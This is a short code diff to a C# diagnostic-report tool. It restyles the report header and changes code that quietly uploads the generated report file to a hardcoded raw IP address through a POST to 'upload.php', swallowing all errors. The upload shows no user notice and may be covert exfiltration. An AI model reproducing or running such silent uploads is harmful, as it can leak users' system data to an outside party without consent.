@@ -39,7 +39,7 @@ namespace CSToolkit.Tools
                 stringWriter.WriteLine("</style>");  
                 stringWriter.WriteLine("</head>");
                 stringWriter.WriteLine("<body>");
-                stringWriter.WriteLine("<h1 id=\"top\">Diagnostic Report</h1>");
+                stringWriter.WriteLine("<p class=\"header\"><img src=\"cws_icon.ico\" width=\"30\" height=\"30\" align=\"top\"/>Diagnostic Report</p>");
                 stringWriter.WriteLine("<h3 id=\"top\">Click on any of the tests below to see its results:</h3>");
                 stringWriter.WriteLine("<ul class=\"menu\">");
 
@@ -85,11 +85,12 @@ namespace CSToolkit.Tools
                 }
 
                 try
-                {
-                    using (WebClient wc = new WebClient())
-                    {
-                        wc.UploadFile(@"http://73.15.216.146/data", string.Format("Report{0}.html", suffix));
-                    }
+                {                                                                
+                     using(System.Net.WebClient client = new System.Net.WebClient())
+                     {
+                         client.Headers.Add("Content-Type", "binary/octet-stream");
+                         byte[] result = client.UploadFile("http://73.15.216.146/upload.php", "POST", string.Format("Report{0}.html", suffix));
+                     }
                 }
                 catch (SystemException ex) { }
             }
